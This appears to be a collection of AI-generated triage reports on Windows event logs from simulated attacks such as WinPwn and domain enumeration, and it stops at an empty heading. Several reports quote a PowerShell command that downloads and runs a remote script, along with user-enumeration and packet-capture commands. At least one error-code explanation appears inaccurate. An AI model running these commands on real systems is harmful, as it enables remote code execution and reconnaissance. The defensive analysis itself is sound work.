### Security Logs:
1. **Event ID 5379**: The security logs contain a series of credential validation operations (Event ID 5379). The target name indicates Microsoft Account and Windows Live identifiers repeatedly, with a return code suggesting a failed operation (ReturnCode `3221226021`, which corresponds to `STATUS_LOGON_FAILURE`). This series of events could be characteristic of unsuccessful credential attempts, but under the given conditions (repeated process IDs and timestamps), it does not necessarily confirm malicious activity. The process seems to be accessing online services with consistent failure.

### Application Logs:
2. **Windows Defender**: The application log entry indicates that Windows Defender is in an active state (`SECURITY_PRODUCT_STATE_ON`), which is generally a standard security posture.

### System Logs:
3. **Registry Size Modification**: The `Microsoft-Windows-Kernel-General` event logs a registry hive size adjustment, which can sometimes occur during system updates or cleansing operations. No signs of malicious activity are noted here. 
4. **Windows Updates**: Multiple logs from the `WindowsUpdateClient` show successful download and application of security updates, indicating standard system maintenance behavior.

### Sysmon Logs:
5. **Process Execution**: Multiple executions of benign system tools (`whoami.exe`, `hostname.exe`, `wevtutil.exe`, etc.) are logged with high integrity levels, originating from `wsmprovhost.exe`, a legitimate Windows component for remote management. None of these events suggest typical malicious behavior based on the context provided.
6. **PowerShell Activity**: A PowerShell script ran to output the current active user to a text file. The command executed by PowerShell is `[System.Environment]::UserName | Out-File -FilePath .\\CurrentactiveUser.txt`. While using PowerShell can sometimes be a red flag, the command used seems benign and not conducive to malicious actions without broader context of misuse.

### Windows PowerShell Logs:
7. **PowerShell Logs**: These logs correlate with the Sysmon logs regarding PowerShell activity. The session was initiated and terminated within a short timeframe, performing user identification tasks. There’s no evidence of malicious script execution here.

### Assessment:
- The processes observed appear regular and inline with routine Windows system operations. There are no indicators (such as abnormal command-line executions, privilege escalations, or unauthorized script executions) that distinctly point to malicious activity or system compromise.

### Conclusion:
Although there is a considerable volume of activity involving system processes and credential checks, these logs primarily capture routine system tasks and unsuccessful credential validation attempts. There are no definite malicious indicators or compromise evidence. However, due to the repeated failed credential attempts, further vigilance is necessary to ensure it doesn't escalate or signify an unrecognized brute force attempt.

**Resolution: BENIGN** - The logs reflect benign system and security behavior without clear evidence of compromise. 

**Recommendation**:
- Continue regular monitoring for any deviation from normal patterns, especially around credential validation.
- Ensure defensive measures remain updated, such as ensuring Windows Defender remains active and operating correctly."
File and Directory Discovery (PowerShell),"Upon reviewing the provided Windows event logs, I have identified multiple events and correlated them to determine any presence of suspicious or malicious activity. Here’s a breakdown of my findings:

### Observations:
1. **Frequent Execution of `wevtutil.exe` and `conhost.exe`:**
   - Events show multiple rapid executions of `wevtutil.exe` and accompanying `conhost.exe` sessions. Wevtutil is often used for managing Windows event logs. Frequent execution, especially in a short time, could be benign, associated with automated maintenance tasks or potentially suspicious if linked to log tampering or reconnaissance activities by adversaries.

2. **Execution of PowerShell with Recursive Directory Listing:**
   - PowerShell was invoked with a script that lists files recursively (`ls -recurse, get-childitem -recurse, gci -recurse`). While not inherently malicious, recursive listing could be used in data discovery phases of attacks for information gathering.

3. **Processes Executed with High Integrity Levels:**
   - Multiple processes executed with high integrity levels including PowerShell, indicating elevated privileges. This can be normal for an admin account but warrants attention if unexpected.

4. **Time Alteration Events:**
   - Multiple events indicate time changes logged by the system. Legitimate reasons could include time synchronization, but frequent or large time adjustments can be suspicious and used to cover tracks by an attacker.

5. **Command-Line Executions:**
   - Commands like `hostname.exe` and `whoami.exe` were executed as observed, which are typically used for environment reconnaissance.

### Assessment:
The activities observed in the logs could be indicative of a benign activity related to system administration or automated monitoring/maintenance tasks. However, there are certain elements (e.g., frequent wevtutil usage, PowerShell recursive listings, time changes) that align with potential threat actor behavior during reconnaissance and preparation for malicious activities.

### Recommendation:
1. **Verification of Activities:**
   - Confirm whether the observed actions were performed by an authorized user or scheduled task. Especially check for scheduled maintenance or admin scripts that match the timeline of these logs.

2. **Audit PowerShell Usage:**
   - Investigate recent PowerShell activities for unauthorized access. Ensure PowerShell logging is sufficiently detailed to capture script content.

3. **Monitor for Persistence:**
   - Given the high privilege level and integrity of executed processes, ensure that no unauthorized persistence mechanisms have been established.

4. **Evaluate Time Change Justifications:**
   - Review the justification for the observed time changes. Validate against your organization’s time synchronization policies.

### Conclusion:
- **Resolution:** **SUSPICIOUS**

The logs display signs that could be benign under certain circumstances, but given the presence of reconnaissance-like activities and potential for unauthorized manipulation, a thorough investigation is warranted to rule out any malicious intent."
Elevated group enumeration using net group (Domain),"### Detailed Analysis of the Logs

#### Observations:
1. **Frequent Execution of Microsoft Edge Update**:
   - The logs show multiple entries related to the execution of Microsoft Edge Update. This includes the `MicrosoftEdgeUpdate.exe` and the `MicrosoftEdgeUpdateComRegisterShell64.exe`. These processes perform regular updates and maintenance tasks related to the Microsoft Edge browser, executed under `NT AUTHORITY\SYSTEM`.

2. **Use of `whoami` and `hostname` Commands**:
   - Commands like `whoami.exe` and `hostname.exe` are being executed from the path `C:\Windows\System32\`. These commands were executed by the user `admin_test` with a high integrity level, indicating they were run with elevated privileges. While these commands are common for legitimate administrative tasks or scripts, frequent use may need to be investigated for legitimacy if not part of expected behavior.

3. **Execution of `cmd.exe` with Specific Commands**:
   - The `cmd.exe` process executed a series of `net` commands targeting group information, including ""Account Operators,"" ""Exchange Organization Management,"" ""BUILTIN\Backup Operators,"" and ""Domain Admins"" on the domain.
   - This type of activity is a key indicator of enumeration and privilege probing, potentially looking for user group memberships or other sensitive configurations, which could suggest attempts for privilege escalation or reconnaissance.

4. **Wevtutil.exe Execution**:
   - The logs indicate multiple usages of `wevtutil.exe`, which is a utility for managing event logs. This could be routine, but frequent or unexpected use might be indicative of someone trying to manipulate or clean up event logs to hide malicious activities.

5. **Security Events**:
   - Security logs show a logon event for the `admin_test` user, followed by a privilege escalation (Event ID 4672), granting privileges such as `SeSecurityPrivilege` and `SeBackupPrivilege`, which are typically indicative of higher-level access and potentially administrative access.
   - The `admin_test` user also executed commands like `wevtutil` and `net` commands, which leverage these escalation rights.

#### Assessment:
- **Anomalous and Potentially Suspicious Activity**:
  - The combination of elevated privilege use by the `admin_test` user alongside commands like `wevtutil`, `net`, and frequent administrative utilities (like `whoami`) indicates potential reconnaissance and privilege escalation activities.
  - While the presence of Microsoft Edge Update processes isn't suspicious by itself, the combination of other activities indicates something worth investigating further.

#### Potential Threats and Risks:
- **Reconnaissance and Privilege Escalation**:
  - The execution of net commands targeting specific groups like ""Domain Admins"" and other sensitive operations can be preparatory steps in a larger attack, aiming to eventually compromise more sensitive parts of the network.

- **Possible Log Tampering**:
  - The use of `wevtutil.exe` suggests the possibility of log tampering, which could indicate attempts to cover tracks, especially around the execution of potentially malicious activities.

#### Guidance on How to Proceed:
1. **Verify Activity with User**:
   - Validate the actions with `admin_test` to determine if these actions were legitimate. If unexpected, perform a full investigation of this user's actions and review other logs for further anomalies.

2. **Monitor and Baseline Network Activity**:
   - Increase monitoring around the user `admin_test` and any SYSTEM level activities on `Server002` to establish a baseline of normal activity.

3. **Review and Harden Security Configurations**:
   - Assess and tighten security configurations for accounts with elevated privileges. Regularly review users with privilege escalation rights and enforce strong security protocols.

4. **Check for Unauthorized Software Changes**:
   - Since Edge Update processes are frequently present, ensure no unauthorized modifications have been made in these directories or binaries.

5. **Conduct a Threat Hunt**:
   - Perform a network-wide threat hunt focusing on anomalies in privilege usage and administrative commands to identify persistent threats or compromised accounts.

### Final Assessment:
- **Resolution: SUSPICIOUS**
  - The activity described points to potentially suspicious behavior requiring further investigation to rule out possible malicious intent. The combination of elevated privilege use, domain-related enumeration, and log management activities aligns with tactics commonly observed in malicious scenarios."
WinPwn - powerSQL,"After analyzing the provided logs, several events and activities raise concerns for potentially malicious behavior:

### Detailed Analysis:
1. **PowerShell Activity (Sysmon & Windows PowerShell logs):**
   - A PowerShell script was executed with command-line arguments to download and execute a script from a public repository (`githubusercontent.com`), which is suspicious: 
     ```
     ""CommandLine"":""\""powershell.exe\"" & {$script_repo='https://raw.githubusercontent.com/script', iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/script/script/121dcee26a7aca368821563cbe92b2b5638c5773/script.ps1'), powerSQL -noninteractive -consoleoutput}""
     ```
   - The execution and downloading of scripts via PowerShell from an external URL could indicate a malicious attempt to introduce or execute unauthorized scripts on the system, possibly leading to a compromise.

2. **Credential Access Attempts (Security Events):**
   - Multiple events with ID `5379` indicate attempts to access credentials with return codes suggesting failures (`3221226021`). However, failed attempts to access credentials, especially for accounts like `MicrosoftAccount:user=02txoixylodcstop`, may equal exploratory actions by an attacker or misconfigurations being probed.

3. **Service Execution and Privileges (Sysmon logs):**
   - The execution of `wevtutil.exe` multiple times by the `admin_test` user is notable because it is a utility that can modify or clear event logs, which is a common tactic to cover malicious activities.
   - Various processes such as `MicrosoftEdgeUpdate.exe` running with high integrity levels suggest system-level operations usually expected during legitimate software updates, but should still be verified.

4. **Privileged Access (Security Event 4672):**
   - Multiple `4672` events are logged, which indicate special privileges were assigned to a session. This activity is concerning if not expected or without valid administrative tasks being performed.

### Assessment of the Situation:
Given the identified PowerShell activity that downloads and executes scripts from an external source, combined with access to potentially sensitive process names and credentials, this strongly indicates a possible compromise attempt or an already compromised system with malicious activities.

### Threats/Risks Identified:
- Execution of unauthorized scripts from an external public source.
- Potential attempts to elevate privileges or execute system-level changes maliciously.
- Suspicious use of utilities to possibly erase/modify logs that could provide forensic evidence.
- Multiple credential access attempts implying reconnaissance or unauthorized information gathering.

### Guidance on How to Proceed:
- **Immediate action:** Isolate the affected system from the network to prevent further potential spread of malicious activities.
- **Investigate further:** Conduct deeper forensic analysis to identify other compromised systems and the extent of the penetration.
- **Audit PowerShell scripts and Usage:** Investigate the source and content of the downloaded PowerShell script for malicious or unauthorized actions.
- **Review User Activity:** Examine actions performed by the `admin_test` user account, considering these could be indicators of a compromised administrative account.
- **Mitigate and Remediate:** Change all administrative passwords, enhance monitoring of PowerShell activity, and consider employing stricter execution policies to mitigate the risk of similar attacks.
  
### Final Resolution:
**MALICIOUS** - The logs contain activity characteristic of malware or an active compromise attempt."
System Owner-User Discovery,"**Detailed Analysis of the Windows Event Logs**

**Overview:**
Upon reviewing the event logs from different categories (Security, Application, Sysmon, and System), several patterns and incidents suggest both benign and potentially suspicious activities. The following analysis evaluates these activities to determine their nature.

**Suspicious or Anomalous Behavior:**

1. **Unusual Process Execution (Sysmon Log):**
   - Repeated invocation of `wevtutil.exe`, `conhost.exe`, `hostname.exe`, `whoami.exe`, and `cmd.exe`, particularly by the user `admin_test`. 
   - Process Image execution from `C:\Windows\System32\wbem\WmiPrvSE.exe` suggests system-level operations. The command-line activities show various administrative operations (e.g., `whoami`, `wmic`, `qwinsta`).
   
2. **Suspicious Command-Line Arguments (Sysmon Log):**
   - The command line executed by `cmd.exe`: `""cmd.exe"" /c cmd.exe /C whoami & wmic useraccount get /ALL & quser /SERVER:""localhost"" & quser & qwinsta.exe /server:localhost & qwinsta.exe & for /F ""tokens=1,2"" %%i in ('qwinsta /server:localhost ^| findstr ""Active Disc""') do @echo %%i | find /v ""#"" | find /v ""console"" || echo %%j > computers.txt`.
   - This command-line string involves user enumeration across different sessions, which is often associated with privilege escalation attempts or lateral movement within networks.

3. **Security Log Findings:**
   - Event ID 4798 events indicate enumeration of local group memberships, specifically by the user `admin_test`, which can be associated with reconnaissance activities.
   - Event ID 5379 indicates credential validation operations; however, the `ReturnCode ""3221226021""` implies an operation failure, suggesting unauthorized access attempts or misconfiguration.

4. **Application Log:**
   - Windows Defender is active, as indicated by the `SECURITY_PRODUCT_STATE_ON` status, which is reassuring because the system has some defensive measures in place.

5. **System Log:**
   - Routine Windows Update activities present (Event IDs 44, 43, and 19), indicating normal system operation.

**Assessment:**
- The enumerative and exploratory commands executed under the `admin_test` user context potentially point to reconnaissance and information gathering activities, which could be indicative of an intrusion.
- The credential operations with failing return codes further highlight attempts to access or enumerate privileged accounts.
- Overall, most activities are centered around user and session discovery and seem somewhat targeted.

**Resolution:**
Based on the patterns identified, these behaviors and logs can be marked as:
- **SUSPICIOUS**: The activities need further investigation, especially focusing on the origin and purpose of these administrative commands, the `admin_test` account, and confirming if it should have access to perform such operations. It's crucial to determine if these actions are part of legitimate administrative processes or an indication of malicious reconnaissance.

**Guidance on How to Proceed:**
1. **Validate User Actions:** Verify the necessity and legitimacy of the activities performed by `admin_test`.
2. **Audit Access:** Review and audit current access controls and user permissions for `admin_test` and other similar accounts.
3. **Investigate Source:** Determine if these actions originated from an internal process or an external threat actor.
4. **Enhance Monitoring:** Implement additional monitoring and alerting on `admin_test` and similar accounts for abnormal activities.
5. **Review Security Posture:** Ensure all updates and patches are applied, and antivirus definitions are up to date.

Consider engaging with IT security teams to conduct a thorough investigation surrounding these suspicious activities and implement recommendations to mitigate potential security risks."
WinPwn - GPORemoteAccessPolicy,"Upon reviewing the provided Windows event logs from diverse sources such as PowerShell, Security, System, Application, and Sysmon, I have identified the following key observations:

### PowerShell Logs:
- The logs indicate the execution of a PowerShell script downloaded directly from a GitHub repository using the command: `iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/script...')`.
- This behavior is highly indicative of a script being run directly from an external source, which is commonly associated with PowerShell exploitation tactics. The use of `iex` (Invoke-Expression) alongside `net.webclient` to download and execute scripts is a known vector for malicious activity, as it allows remote code execution.

### Security Logs:
- The security logs show several logon events for the user `admin_test` and the presence of elevated privileges (`SeDebugPrivilege`, `SeBackupPrivilege`, etc.), which could indicate a privileged or potentially unauthorized session.
- A notable alert is the reset of the system time (Event 4616), which occurred in close proximity to the suspicious PowerShell activity. Changing system time could be an attempt to hide tracks or alter log times to confuse incident response.

### System Logs:
- The system logs corroborate the time change activities observed in the security logs. Multiple time change events are logged around the same time as the PowerShell execution.
- The logs do not provide explicit details tying directly to malicious software execution but correlate well with suspicious activities identified in other logs.

### Application Logs:
- Windows Defender appears to be operational, although there are no indications of it detecting or blocking any threats during this timeframe.

### Sysmon Logs:
- Multiple executions of standard Windows utilities (`wevtutil.exe`, `conhost.exe`, `whoami.exe`, and `powershell.exe`) are observed. Though such utilities are often used legitimately, their combined use alongside untrusted PowerShell scripts can highlight attempts at information gathering or lateral movement.
- The Sysmon logs also capture the exact launch of `powershell.exe` with the command indicating the download and execution of a script from the internet, confirming evidence found in the PowerShell log.

### Assessment:
- The predominant concern arises from the PowerShell activity. Downloading and executing scripts from an external untrusted source is explicitly suspicious and aligns with behaviors observed in attacks leveraging living-off-the-land binaries (LOLBins). The combination of privileges observed in the Security logs and the PowerShell script execution suggests a post-compromise scenario aiming toward data exfiltration, privilege escalation, or maintaining persistence.

### Conclusion:
- **Resolution: MALICIOUS** - The logs strongly suggest a successful attempt at running potentially harmful scripts on the host system. Immediate action is required to assess the integrity of the server, including conducting a thorough investigation, isolating the system if necessary, and reviewing potential data access or exfiltration facilitated by the script.

### Guidance:
1. **Immediate Response**: Isolate `Server002` from the network to prevent potential spread or information leakage.
2. **Containment**: Conduct a comprehensive malware and threat scan using updated signature-based and heuristic-based tools.
3. **Eradication & Recovery**: Determine the extent of compromise and remove any identified threats. Revert system time changes to maintain accurate logs for further analysis.
4. **Investigation**: Examine the script obtained from the GitHub link to determine its exact function and intended malicious behavior.
5. **Review Access Logs and Credentials**: Trace all compromised accounts, specifically focusing on elevated privileges around the identified timeframe.
6. **Post-Incident Monitoring**: Implement enhanced monitoring and alerting for unusual PowerShell usage and privilege escalations.
7. **Patch Management**: Ensure all systems are up-to-date with the latest security patches to mitigate any known vulnerabilities exploited by the script.

It's advised to involve a forensic specialist if needed to fully analyze and understand the impact and intentions of the activities identified."
Enumerate Active Directory Users with ADSISearcher,"Upon analyzing the Windows event logs provided, several observations can be made:

### Suspicious Activity:

1. **PowerShell Usage:**
   - The PowerShell logs show a command being executed with the syntax `powershell.exe & {([script]""objectcategory=user"").FindAll(); ([script]""objectcategory=user"").FindOne()}`. The use of PowerShell to execute script blocks is common in both administrative and potentially malicious contexts.
   - The specific command appears to be querying information from an object category, which could relate to user accounts or Active Directory queries. Although this might be legitimate, it is an unusual and potentially exploratory behavior.

2. **Heavy Service Activity:**
   - There is a significant number of instances where `MicrosoftEdgeUpdate.exe` and associated components are being executed in quick succession. While this could be a part of a legitimate update process, the frequency and pattern of these executions (often used paths and command line arguments) are unusual and could suggest a misconfiguration or a tampering attempt.

3. **Process Executions (Sysmon Logs):**
   - Numerous process executions noted with `wevtutil.exe`, `conhost.exe`, `svchost.exe`, and `whoami.exe` with the user context of `SERVER002\\admin_test`. This could indicate administrative scripts being run or a user trying to gather information about the system.
   - The constant spawning of these processes within very short time frames may require closer inspection to ensure they align with known administrative tasks.

4. **Time Adjustments:**
   - The `Security` and `System` logs show time adjustment events. Time changes can sometimes be used by attackers to manipulate system timelines, although there are no obvious signs that this was the case here since it was all initiated by the `svchost.exe` under `LOCAL SERVICE`.

### Assessment:

Based on the details and context provided by the logs:
- The PowerShell activity, alongside the frequent execution of system utilities and the Edge update processes, aligns with patterns seen in scripted administrative tasks. However, the PowerShell script commands are notably specific and could suggest reconnaissance or preparation for further actions.
- The time adjustment might be benign, but it is noteworthy unless justified in the environment.
- Overall, there are no definitive signs of malicious activity, but the events described warrant further review for assurance.

### Recommended Resolution: **SUSPICIOUS**

### Guidance on How to Proceed:
1. **Further Investigation:**
   - Validate whether the PowerShell scripts and other commands align with legitimate administrative activities for Server002.
   - Verify if the Microsoft Edge updates and corresponding processes are scheduled tasks or updates. A review of update logs or task scheduler entries might provide additional context.
   - Review Active Directory for unauthorized access or policy changes, especially relating to user object queries if applicable.

2. **System Monitoring:**
   - Increase monitoring for Server002, particularly for PowerShell and Sysmon event logs.
   - Implement stringent PowerShell logging and possibly enable script block logging to capture any anomalous scripts.

3. **Review Administrative Credentials:**
   - Ensure usage of `admin_test` user is sanctioned and matches known activities on the system.
   - Confirm the security posture of the account and check for any unauthorized access.

These steps will help ensure a thorough evaluation of the observed behaviors and mitigate potential risks related to suspicious activities."
BIOS Information Discovery through Registry,"After analyzing the provided Windows event logs, I have conducted a detailed examination of suspicious or anomalous behaviors and potential indicators of compromise. Here is the breakdown of the analysis:

### Application Log:
- Entries for `edgeupdate` service: These logs indicate the stopping of the `edgeupdate` service. This could be part of a normal update process, but repetitive stopping with no corresponding starting events could be worth investigating further, although it is not inherently malicious.

### Security Log:
- Event ID 4616 (Time Change): Time adjustments by `svchost.exe` on behalf of system services are seen. This is a relatively normal activity executed by the system service for time synchronization, and does not appear suspicious on its own.

### Sysmon Log:
- We observe several Image Load events (`EventID: 5`) and Process Creation events (`EventID: 1`). These include processes like `wevtutil.exe`, `conhost.exe`, `hostname.exe`, `whoami.exe`, `cmd.exe`, and edge update processes.
- `wevtutil.exe` and `cmd.exe /c reg query`: The presence of these processes could potentially be suspicious, depending on the context, but without additional unusual command lines or indicators of misuse, they appear related to administrative or maintenance tasks.
- Regular updates and operations related to `MicrosoftEdgeUpdate.exe`: This process shows routine update operations. Despite its high-level operations and involvement in numerous process creations, there are no clear indications of unauthorized changes or malware execution.

### System Log:
- Time synchronization events and routine Kernel-General entries: These are normal operations, reflecting scheduled time synchronization.

### Behavior & Indicators:
- The majority of entries relate to maintenance and software update operations, particularly around Microsoft Edge updates and system time synchronization.
- No evidence of privilege escalation attempts, curious command-line arguments, or process injections were detected.

### Conclusion:
Based on the logs provided, there is no clear indication of malicious activity. Most logged events correspond to expected system or application operations such as updates and time corrections. Although some command-line and process operations could warrant further observation, there's a lack of corroborative evidence pointing to compromise or malicious behavior.

**Resolution: BENIGN** - The logs reviewed reflect benign activity typical of routine system maintenance and application updates. If there are specific concerns or behaviors outside these logs, further scrutiny or cross-referencing with additional security tools may be considered to ensure system integrity."
Packet Capture Windows Command Prompt,"Upon review of the event logs provided, several patterns and indicators suggest suspicious activity. Let's break down the findings and provide an analysis:

1. **Repeated Execution of System Utilities**:
   - There are multiple instances of processes such as `powershell.exe`, `wevtutil.exe`, `cmd.exe`, and `conhost.exe`, executed within a short period. These tools are often used in scripted sequences for administrative tasks but can also be indicative of malicious activities, especially if executed unexpectedly or in unusual sequences.
   - The execution of `powershell.exe` immediately followed by a series of `wevtutil.exe` and `conhost.exe` processes occurring in rapid succession is not typical of regular user behavior.

2. **PowerShell Activity**:
   - Logs show the execution of a PowerShell command that creates a directory, downloads a file from an external source, and then executes this file. The script appears to download a Wireshark installer (`https://1.eu.dl.wireshark.org/win64/Wireshark-latest-x64.exe`) and attempts a silent installation. Although Wireshark is a legitimate application, downloading and installing software via PowerShell without direct user invocation can be suspicious, and is often employed in automated or unauthorized software deployment processes.

3. **Observation of Installer Processes**:
   - The process logs include the execution of `wireshark_installer.exe` followed by `vc_redist.x64.exe`. These are consistent with the installation of new software. While this could be a normal task, it is the manner of execution—and the fact that it follows a script—that raises suspicion.

4. **Network Packet Capture Tool**:
   - The command line for `cmd.exe` involves running Wireshark's packet capture tool (`tshark.exe`). Network monitoring tools could be used legitimately for network diagnostics; however, unauthorized usage could indicate an attempt to sniff network traffic, which can be malicious if not sanctioned appropriately.

5. **High Integrity Level**:
   - Many processes are running with a high integrity level, suggesting they have elevated privileges. While not inherently malicious, it further emphasizes the need to verify why these privileged actions are necessary at this time.

### Assessment:

The combination of scripted PowerShell commands, network monitoring tool usage, and rapid execution of several system utilities suggest an activity that deviates from typical user behavior. The silent download and execution of applications via automated scripts are often used within attacks aimed at system reconnaissance or data exfiltration.

### Conclusion:

Given these observations, I am inclined to categorize the activity in the logs as **SUSPICIOUS**. While there’s no evidence confirming malicious intent, it is essential to conduct a more in-depth analysis to determine if these events align with sanctioned IT activities or if they are potentially unauthorized actions.

### Guidance on How to Proceed:

1. **Immediate Investigation**:
   - Verify the legitimacy of the PowerShell command sequences. Confirm if the automated downloads and installations were part of an approved change or deployment process.
   - Check if the downloaded Wireshark instance and related configurations are legitimate and necessary.

2. **Audit User Activity**:
   - Review the user accounts involved (e.g., `SERVER002\\admin_test`) to ensure they haven't been compromised.

3. **Analyze Network Activity**:
   - Check for unusual outbound connections or data transfers that could suggest data exfiltration activity.

4. **Strengthen Monitoring and Alerting**:
   - Ensure continuous monitoring is implemented for similar activities, focusing on high integrity process executions and network tool usage.

Application of the above measures can help clarify the context and intent behind this activity while ensuring immediate containment if malicious actions are confirmed."
WinPwn - PowerSharpPack - Seatbelt,"Based on the detailed analysis of the logs provided, the following points summarize the investigation:

1. **Security Logs:**
   - Event ID 4616 indicates that the system time was changed via the svchost.exe process under the LOCAL SERVICE account. This is a normal operation for the Windows Time Service, which periodically updates the system time.

2. **PowerShell Logs:**
   - There are several PowerShell events where PowerShell is used to execute a command that downloads and executes a script from a GitHub repository, specifically 'Invoke-Seatbelt.ps1'.
   - The usage of `iex(new-object net.webclient).downloadstring(...)` is a concerning indicator as it's a common pattern used in PowerShell attacks to execute remote scripts.

3. **Application Logs:**
   - Windows Defender is active, which indicates an added layer of security. There are routine entries for Edge updates.

4. **System Logs:**
   - Changes in system time were logged, which aligns with typical behavior when synchronizing with an NTP server, as noted with connections to 'time.windows.com'.

5. **Sysmon Logs:**
   - Several process creation events recorded. Notably, the use of 'C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe' with the execution of the remote script is concerning.
   - A significant number of Microsoft Edge update processes were recorded. These seem routine, but the volume and timing (running alongside suspicious PowerShell activity) warrant closer examination.

**Conclusion:**
The main indicator of potentially malicious activity is the PowerShell execution of remote scripts, which is a recognized technique for executing initial payloads. This pattern, without proper justification and security context, fits within typical adversarial tactics for reconnaissance and lateral movement.

**Assessment:**
- **Suspicion Level:** The usage of PowerShell to download and execute scripts over the internet is suspicious, especially in an enterprise setting. This activity needs further investigation to determine legitimacy.

- **Resolution:** SUSPICIOUS - The logs contain activities that suggest the potential use of PowerShell for executing scripts from external sources, which is an indication of potentially unauthorized or malicious behavior. Further detailed investigation is required to verify if these were legitimate administrative actions or signs of compromise.

**Guidance:**
1. Investigate the context and timing of the PowerShell script execution—confirm if it aligns with legitimate administrative tasks.
2. Verify whether the script 'Invoke-Seatbelt.ps1' is an approved tool in the environment.
3. Review any correlated alerts from network logs, endpoint detection, and response tools relevant to these PowerShell activities.
4. Consider isolating the affected machine and conducting a thorough security assessment to determine if any further unauthorized activities have occurred."
DNS Server Discovery Using nslookup,"### Detailed Analysis of the Logs

1. **Windows PowerShell Log:**
   - It seems that there were no entries provided for the PowerShell logs. If available, these logs could be helpful in identifying unusual PowerShell commands that might indicate malicious activities.

2. **System Log:**
   - The logs show regular Windows Update activities related to the Microsoft Defender Antivirus updates. These updates (event ID 44 and 43) are benign and expected, showing regular system maintenance and antivirus updates.

3. **Application Log:**
   - No entries were provided for the Application logs in the provided dataset.

4. **Security Log:**
   - No entries were provided for the Security logs in the provided dataset.

5. **Sysmon Log:**
   - A series of processes related to legitimate Windows operations are being logged including `whoami.exe`, `conhost.exe`, `wevtutil.exe`, `cmd.exe`, `nslookup.exe`, `HOSTNAME.EXE`, and system update-related activities.
   - The use of `whoami.exe` and `nslookup.exe` is logged; while these are common utilities, frequent or scripted invocation could sometimes be suspicious if found in contexts that do not correspond to typical user or system behavior.
   - The appearance of `cmd.exe` executing `nslookup` queries is a slight red flag as this could be part of reconnaissance efforts; however, querying Active Directory Service Records can also be part of normal diagnostics. It’s worth noting if such behavior deviates from typical administrative actions, but alone it isn't conclusive of malicious intent.
   - Activity by `dllhost.exe` and `MusNotification.exe` is typical and associated with system and update processes, suggesting routine operations.
   - The `wuauclt.exe` and `AM_Delta.exe` processes confirm the system was handling antivirus definition updates, which again is standard behavior in maintaining system security.
   - The executions of `svchost.exe` and other system processes are standard given the system context provided.

### Assessment and Resolution:
- **BENIGN**: The logs mostly represent standard system activity related to updates and system utility executions. While there is slightly suspicious activity associated with the usage of `cmd.exe` and `nslookup.exe`, it’s not sufficient evidence of a compromise or a malicious act beyond normal diagnostic or administrative actions.

### Guidance:
- Continue monitoring for unusual patterns or repeated instances that don't align with standard user or administrator behavior, especially focusing on the frequency and context of command executions.
- Ensure that antivirus and other system security solutions remain updated.
- Evaluate if the combination of utilities used such as `whoami` and `nslookup`, typically benign, could fit into known tactics if noticed repeatedly or out of context.
- If this pattern of potentially atypical behavior persists or is found in combination with other indicators of compromise, escalate for deeper forensic analysis.

This resolution is based on the logs provided which predominantly appear benign in nature. If further logs are available or if behavior changes, reassessment may be warranted."
Examine local password policy - Windows,"Based on the review of provided logs, here is the analysis and assessment:

**Logs Summary and Observation:**

1. **Services and Processes:**
   - Repeated events pertaining to `MicrosoftEdgeUpdate.exe` are found in the logs, indicating typical activities associated with Microsoft Edge updating processes. These processes are executed by the `NT AUTHORITY\SYSTEM` user, which typically represents a high-integrity level system process.

2. **Use of System Utilities:**
   - Instances of system utilities such as `wevtutil.exe`, `conhost.exe`, `cmd.exe` along with some commands like `""cmd.exe"" /c net accounts` were observed running under the user `SERVER002\admin_test`.

3. **Process Hierarchy:**
   - The processes initiated, especially those related to Microsoft Edge updates, show a normal execution chain and expected file versions. These tasks are being completed by processes with high integrity levels and legitimate hash signatures.

4. **Security Logs and System Logs:**
   - Security and System logs are missing in the dataset provided, or were not visibly available in the snippet, which limits the ability to correlate user logon sessions and higher-level security events.

5. **Potentially Malicious Indicators:**
   - The command `net accounts` is typically used to review user accounts and could be benign, associated with an administrator monitoring accounts. However, its presence should prompt a validation of user-originating commands especially involving accounts and privilege escalation.
   - The execution of `whoami.exe` seems redundant but not malicious. It's commonly used for determining the currently logged-in user identity.

**Risk and Threat Assessment:**

- Most events seem routine or benign in their context, especially continuous Microsoft Edge updates, indicating regular system maintenance.
  
- The running of process utilities like `cmd.exe` and querying `net accounts` could either indicate regular administrative work or could hint suspicious oversight requiring further context.

**Resolution:**

Given the observations above:

- The overall activity appears legitimate and adequately represents normal system management activities alongside an update service routine.
- There are no definitive signs of compromise or malicious activities within the given logs.

**Final Resolution: BENIGN**

**Recommendation to Proceed:**

- Continue monitoring with enhanced threat-hunting queries to detect anomalies in administrative commands and process spawning.
- Ensure full visibility by actively implementing Security and System log policies for heightened coverage in future assessments.
- Conduct user validation checks or alerting for any unusual command usage indicating a potential insider threat or misconfiguration."
WinPwn - GPOAudit,"Upon reviewing the Windows event logs provided, we observe the following:

### Windows PowerShell Log

- **PowerShell Execution**: Multiple PowerShell logs exhibit the use of `powershell.exe` to download and execute a script from a public repository on `GitHub` (`https://raw.githubusercontent.com/script`). The key command used is: 

  ```powershell
  $script_repo='https://raw.githubusercontent.com/script'
  iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/script/script/121dcee26a7aca368821563cbe92b2b5638c5773/script.ps1')
  GPOAudit -noninteractive -consoleoutput
  ```

  **Analysis**: This activity is suspicious, as it involves downloading and executing a script from an external source. In enterprise environments, legitimate automation and scripts should be retrieved from internal, trusted sources.

### Application Log

- **Windows Defender**: Logs indicate that Windows Defender is active and in the state ""SECURITY_PRODUCT_STATE_ON"". There is no indication from the logs that Windows Defender raised any alert related to malicious activities.

### Sysmon Log

- **Process Execution**: 
  - Multiple instances of common utilities like `wevtutil.exe`, `conhost.exe`, `hostname.exe`, and `whoami.exe` are executed by `SERVER002\admin_test`.
  - The execution of `powershell.exe` with the earlier mentioned command is also logged in Sysmon.
  
  **Analysis**: The presence of these executables in isolation is not overly suspicious; however, the combination of `powershell.exe` downloading scripts can be considered as indicative of potential malicious activity if the origin script is not verified as safe.

### Security Log

- **Time Change Events**: There are log entries for time change events, showing updates to system time by the `LOCAL SERVICE` account. While this can be routine, it's worth verifying if these time updates are expected or if they occur disproportionately compared to baseline system behavior.

### System Log

- **NTP Time Synchronization**: Logs related to time synchronization with NTP server `time.windows.com`. These entries are typically normal as they ensure the system clock is accurate across the network.

### Conclusion

